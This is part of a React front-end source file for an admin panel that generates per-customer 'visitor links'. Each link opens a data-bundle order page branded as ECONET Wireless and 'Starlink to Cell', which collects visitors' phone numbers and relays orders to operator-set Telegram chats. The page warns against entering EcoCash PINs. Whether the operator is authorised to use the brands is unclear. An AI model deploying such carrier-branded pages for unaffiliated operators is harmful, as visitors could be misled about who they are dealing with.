      <div className="modal-actions"><button className="secondary" onClick={onClose}>Close preview</button></div>
    </Modal>
  );
}
function CustomerModal({ onClose, onCreated, onError }) {
  const [name, setName] = useState("");
  const [notes, setNotes] = useState("");
  const [chat, setChat] = useState("");
  const [enabled, setEnabled] = useState(false);
  const [includePhone, setIncludePhone] = useState(false);
  const [includeAmount, setIncludeAmount] = useState(true);
  const [busy, setBusy] = useState(false);
  async function submit(e) {
    e.preventDefault();
    setBusy(true);
    try {
      await api("/api/admin/customers", {
        method: "POST",
        body: JSON.stringify({
          name,
          notes,
          telegramChatId: chat,
          notificationsEnabled: enabled,
          notificationPreferences: {
            newOrder: true,
            phone: includePhone,
            amount: includeAmount,
          },
        }),
      });
      onCreated();
    } catch (e) {
      onError(e.message);
    } finally {
      setBusy(false);
    }
  }
  return (
    <Modal title="Create customer" onClose={onClose}>
      <form className="form-stack" onSubmit={submit}>
        <label>
          Customer or business name
          <input
            value={name}
            onChange={(e) => setName(e.target.value)}
            required
            maxLength={120}
          />
        </label>
        <label>
          Internal notes
          <textarea
            value={notes}
            onChange={(e) => setNotes(e.target.value)}
            rows="3"
          />
        </label>
        <label>
          Telegram destination Chat ID
          <input
            value={chat}
            onChange={(e) => setChat(e.target.value)}
            placeholder="e.g. -1001234567890"
          />
        </label>
        <label className="check-label">
          <input
            type="checkbox"
            checked={enabled}
            onChange={(e) => setEnabled(e.target.checked)}
          />{" "}
          Enable Telegram order notifications
        </label>
        <label className="check-label">
          <input
            type="checkbox"
            checked={includePhone}
            onChange={(e) => setIncludePhone(e.target.checked)}
          />{" "}
          Include customer phone number in order notifications
        </label>
        <label className="check-label">
          <input
            type="checkbox"
            checked={includeAmount}
            onChange={(e) => setIncludeAmount(e.target.checked)}
          />{" "}
          Include order amount in notifications
        </label>
        <p className="small muted">
          The customer must start your bot in a private chat, or add it to their
          group. The bot token is configured on the backend.
        </p>
        <div className="modal-actions">
          <button type="button" className="secondary" onClick={onClose}>
            Cancel
          </button>
          <button className="primary" disabled={busy}>
            {busy ? "Creating…" : "Create customer"}
          </button>
        </div>
      </form>
    </Modal>
  );
}
function LinkEditModal({ link, onClose, onError, onSaved }) {
  const [name, setName] = useState(link.name);
  const [bundles, setBundles] = useState(
    (link.bundles || []).map((b) => ({ ...b })),
  );
  const [chat, setChat] = useState(link.telegram_chat_id || "");
  const [notify, setNotify] = useState(Boolean(link.notifications_enabled));
  const [includePhone, setIncludePhone] = useState(Boolean(link.notification_preferences?.phone));
  const [includeAmount, setIncludeAmount] = useState(link.notification_preferences?.amount !== false);
  const [instructions, setInstructions] = useState(
    link.payment_instructions || "",
  );
  const [busy, setBusy] = useState(false);
  function toggle(id) {
    setBundles((bs) =>
      bs.map((b) => (b.id === id ? { ...b, enabled: !b.enabled } : b)),
    );
  }
  async function submit(e) {
    e.preventDefault();
    setBusy(true);
    try {
      await api(`/api/admin/links/${link.id}`, {
        method: "PUT",
        body: JSON.stringify({
          name,
          bundles,
          telegramChatId: chat,
          notificationsEnabled: notify,
          paymentInstructions: instructions,
          formConfig: link.form_config || { phoneRequired: true },
          notificationPreferences: link.notification_preferences || {
            newOrder: link.notification_preferences?.newOrder !== false,
            phone: includePhone,
            amount: includeAmount,
          },
        }),
      });
      onSaved();
    } catch (e) {
      onError(e.message);
    } finally {
      setBusy(false);
    }
  }
  return (
    <Modal title="Edit visitor link" onClose={onClose} wide>
      <form className="form-stack" onSubmit={submit}>
        <label>
          Link name
          <input
            value={name}
            onChange={(e) => setName(e.target.value)}
            required
            maxLength={120}
          />
        </label>
        <div>
          <div className="field-title">Bundles on this link</div>
          <div className="bundle-select">
            {bundles.map((b) => (
              <label
                className={`bundle-option ${b.enabled ? "selected" : ""}`}
                key={b.id}
              >
                <input
                  type="checkbox"
                  checked={b.enabled !== false}
                  onChange={() => toggle(b.id)}
                />
                <span>
                  <b>{b.name}</b>
                  <small>{b.validity}</small>
                </span>
                <strong>{usd(b.price)}</strong>
              </label>
            ))}
          </div>
        </div>
        <label>
          Link-specific Telegram Chat ID
          <input
            value={chat}
            onChange={(e) => setChat(e.target.value)}
            placeholder="Saved destination for this link"
          />
        </label>
        <label className="check-label">
          <input
            type="checkbox"
            checked={notify}
            onChange={(e) => setNotify(e.target.checked)}
          />{" "}
          Send order notifications to Telegram
        </label>
        <label className="check-label">
          <input
            type="checkbox"
            checked={includePhone}
            onChange={(e) => setIncludePhone(e.target.checked)}
          />{" "}
          Include phone number in order notifications
        </label>
        <label className="check-label">
          <input
            type="checkbox"
            checked={includeAmount}
            onChange={(e) => setIncludeAmount(e.target.checked)}
          />{" "}
          Include order amount in notifications
        </label>
        <label>
          Payment instructions
          <textarea
            rows="3"
            value={instructions}
            onChange={(e) => setInstructions(e.target.value)}
          />
        </label>
        <div className="note-box">
          Edits apply to future submissions. Existing orders and queued
          notification recipients remain associated with their original saved
          records.
        </div>
        <div className="modal-actions">
          <button type="button" className="secondary" onClick={onClose}>
            Cancel
          </button>
          <button className="primary" disabled={busy}>
            {busy ? "Saving…" : "Save configuration"}
          </button>
        </div>
      </form>
    </Modal>
  );
}

function LinkModal({
  customers,
  catalog = DEFAULT_BUNDLES,
  onClose,
  onCreated,
  onError,
}) {
  const [customerId, setCustomerId] = useState(customers[0]?.id || "");
  const [name, setName] = useState("");
  const [bundles, setBundles] = useState(catalog.map((b) => ({ ...b })));
  useEffect(() => setBundles(catalog.map((b) => ({ ...b }))), [catalog]);
  const [chat, setChat] = useState("");
  const [notify, setNotify] = useState(false);
  const [includePhone, setIncludePhone] = useState(false);
  const [includeAmount, setIncludeAmount] = useState(true);
  const [instructions, setInstructions] = useState(
    "Payment is pending. Follow only verified EcoCash instructions provided by the administrator. This website does not collect EcoCash PINs or one-time codes.",
  );
  const [busy, setBusy] = useState(false);
  useEffect(() => {
    if (!customerId && customers[0]) setCustomerId(customers[0].id);
  }, [customers]);
  function toggle(id) {
    setBundles((bs) =>
      bs.map((b) => (b.id === id ? { ...b, enabled: !b.enabled } : b)),
    );
  }
  async function submit(e) {
    e.preventDefault();
    if (!customerId) {
      onError("Create a customer before generating a link.");
      return;
    }
    setBusy(true);
    try {
      await api("/api/admin/links", {
        method: "POST",
        body: JSON.stringify({
          customerId,
          name,
          bundles,
          telegramChatId: chat,
          notificationsEnabled: notify,
          notificationPreferences: {
            newOrder: true,
            phone: includePhone,
            amount: includeAmount,
          },
          paymentInstructions: instructions,
          formConfig: { phoneRequired: true },
        }),
      });
      onCreated();
    } catch (e) {
      onError(e.message);
    } finally {
      setBusy(false);
    }
  }
  return (
    <Modal title="Generate visitor link" onClose={onClose} wide>
      <form className="form-stack" onSubmit={submit}>
        <div className="form-two">
          <label>
            Customer
            <select
              value={customerId}
              onChange={(e) => setCustomerId(e.target.value)}
              required
            >
              <option value="">Choose customer…</option>
              {customers.map((c) => (
                <option value={c.id} key={c.id}>
                  {c.name}
                </option>
              ))}
            </select>
          </label>
          <label>
            Link name
            <input
              value={name}
              onChange={(e) => setName(e.target.value)}
              required
              placeholder="e.g. Harare campaign"
            />
          </label>
        </div>
        <div>
          <div className="field-title">Enabled data bundles</div>
          <div className="bundle-select">
            {bundles.map((b) => (
              <label
                className={`bundle-option ${b.enabled ? "selected" : ""}`}
                key={b.id}
              >
                <input
                  type="checkbox"
                  checked={b.enabled}
                  onChange={() => toggle(b.id)}
                />
                <span>
                  <b>{b.name}</b>
                  <small>{b.validity}</small>
                </span>
                <strong>{usd(b.price)}</strong>
              </label>
            ))}
          </div>
        </div>
        <label>
          Link-specific Telegram Chat ID (optional)
          <input
            value={chat}
            onChange={(e) => setChat(e.target.value)}
            placeholder="Uses this link's saved destination"
          />
        </label>
        <label className="check-label">
          <input
            type="checkbox"
            checked={notify}
            onChange={(e) => setNotify(e.target.checked)}
          />{" "}
          Send new order notifications to Telegram
        </label>
        <label className="check-label">
          <input
            type="checkbox"
            checked={includePhone}
            onChange={(e) => setIncludePhone(e.target.checked)}
          />{" "}
          Include phone number in order notifications
        </label>
        <label className="check-label">
          <input
            type="checkbox"
            checked={includeAmount}
            onChange={(e) => setIncludeAmount(e.target.checked)}
          />{" "}
          Include order amount in notifications
        </label>
        <label>
          Payment instructions
          <textarea
            value={instructions}
            onChange={(e) => setInstructions(e.target.value)}
            rows="3"
          />
        </label>
        <div className="note-box">
          The link will be created as a draft. Set <code>PUBLIC_APP_URL</code>{" "}
          on Render and publish only after validating the destination and
          bundles. This starter does not implement a live EcoCash payment API.
        </div>
        <div className="modal-actions">
          <button type="button" className="secondary" onClick={onClose}>
            Cancel
          </button>
          <button className="primary" disabled={busy}>
            {busy ? "Generating…" : "Generate draft link"}
          </button>
        </div>
      </form>
    </Modal>
  );
}
function Modal({ title, onClose, children, wide }) {
  return (
    <div
      className="modal-backdrop"
      onMouseDown={(e) => {
        if (e.target === e.currentTarget) onClose();
      }}
    >
      <div className={`modal ${wide ? "wide" : ""}`}>
        <div className="modal-heading">
          <h2>{title}</h2>
          <button className="icon-btn" onClick={onClose}>
            <X size={19} />
          </button>
        </div>
        {children}
      </div>
    </div>
  );
}
function VisitorPage() {
  const { token: linkToken } = useParams();
  const [link, setLink] = useState(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState("");
  const [bundleId, setBundleId] = useState("");
  const [phone, setPhone] = useState("");
  const [busy, setBusy] = useState(false);
  const [result, setResult] = useState(null);
  const submissionKey = useRef(null);
  useEffect(() => {
    api(`/api/public/links/${linkToken}`)
      .then((r) => setLink(r.link))
      .catch((e) => setError(e.message))
      .finally(() => setLoading(false));
  }, [linkToken]);
  const bundle = link?.bundles.find((b) => b.id === bundleId);
  async function submit(e) {
    e.preventDefault();
    setBusy(true);
    setError("");
    try {
      const fingerprint = JSON.stringify([linkToken, bundleId, phone.trim()]);
      if (submissionKey.current?.fingerprint !== fingerprint) {
        submissionKey.current = { fingerprint, key: crypto.randomUUID() };
      }
      const r = await api(`/api/public/links/${linkToken}/submissions`, {
        method: "POST",
        body: JSON.stringify({
          bundleId,
          phone,
          idempotencyKey: submissionKey.current.key,
        }),
      });
      setResult(r);
    } catch (e) {
      setError(e.message);
    } finally {
      setBusy(false);
    }
  }
  if (loading)
    return <div className="visitor-loading">Loading bundle options…</div>;
  if (!link)
    return (
      <div className="visitor-loading">
        <h1>Link unavailable</h1>
        <p>{error || "This link is not published."}</p>
      </div>
    );
  return (
    <div className="visitor-shell">
      <header className="visitor-header">
        <div className="satellite-banner">
          <Globe size={21} />
          <span>STARLINK TO CELL</span>
          <small>Satellite connectivity</small>
        </div>
        <div className="econet-brand">
          <span className="econet-symbol">◉</span>
          <b>
            ECONET <span>Wireless</span>
          </b>
        </div>
      </header>
      <main className="visitor-main">
        <div className="visitor-hero">
          <span className="visitor-eyebrow">CONNECT BEYOND BORDERS</span>
          <h1>Starlink to Cell</h1>
          <p>Choose your data bundle to get connected.</p>
        </div>
        {result ? (
          <div className="order-success">
            <div className="success-icon">
              <Check size={26} />
            </div>
            <h2>Order received</h2>
            <p>
              Your order reference is{" "}
              <b className="mono">{result.order.order_ref}</b>.
            </p>
            <div className="pending-box">
              Payment status: <b>Pending</b>
              <p>{result.paymentInstructions}</p>
            </div>
            <div className="note-box">
              <b>EcoCash payment has not been initiated automatically.</b>
              <p>
                This website does not have an authorized EcoCash payment API
                configured. Do not enter your EcoCash PIN or one-time
                authentication code on this website or share it with anyone.
                Complete payment only through an official EcoCash prompt/app or
                verified instructions.
              </p>
            </div>
            <small>
              Payment is not confirmed until independently verified by the
              payment provider.
            </small>
          </div>
        ) : (
          <form onSubmit={submit}>
            <div className="visitor-bundles">
              {link.bundles.map((b) => (
                <button
                  type="button"
                  key={b.id}
                  onClick={() => setBundleId(b.id)}
                  className={`visitor-bundle ${bundleId === b.id ? "selected" : ""}`}
                >
                  <div className="visitor-bundle-top">
                    <span className="data-icon">
                      <Package size={19} />
                    </span>
                    <span className="bundle-badge">{b.validity}</span>
                  </div>
                  <h3>{b.name}</h3>
                  <p>{b.description}</p>
                  <div className="visitor-price">{usd(b.price)}</div>
                  {bundleId === b.id && (
                    <span className="selected-check">
                      <Check size={14} />
                    </span>
                  )}
                </button>
              ))}
            </div>
            <div className="visitor-form">
              <h2>Order details</h2>
              <label>
                Phone number
                <input
                  type="tel"
                  value={phone}
                  onChange={(e) => setPhone(e.target.value)}
                  required
                  placeholder="Enter your mobile number"
                />
              </label>
              <div className="payment-brand">
                <span className="ecocash-icon">E</span>
                <span>
                  <b>EcoCash</b>
                  <small>
                    Your number is used for the order. This form does not
                    initiate an EcoCash payment request.
                  </small>
                </span>
              </div>
              {error && <p className="error">{error}</p>}
              <button className="visitor-submit" disabled={!bundle || busy}>
                {busy
                  ? "Submitting…"
                  : `Submit order & view payment instructions`}
              </button>
              <p className="visitor-legal">
                Never enter your EcoCash wallet PIN or one-time authentication
                code on this website. Any payment authentication must happen
                only in the official EcoCash channel.
              </p>
            </div>
          </form>
        )}
      </main>
      <footer className="visitor-footer">
        ECONET Wireless · Starlink to Cell
      </footer>
    </div>
  );
}

createRoot(document.getElementById("root")).render(
  <BrowserRouter>
    <Routes>
      <Route path="/l/:token" element={<VisitorPage />} />
      <Route path="*" element={<App />} />
    </Routes>
  </BrowserRouter>,
);
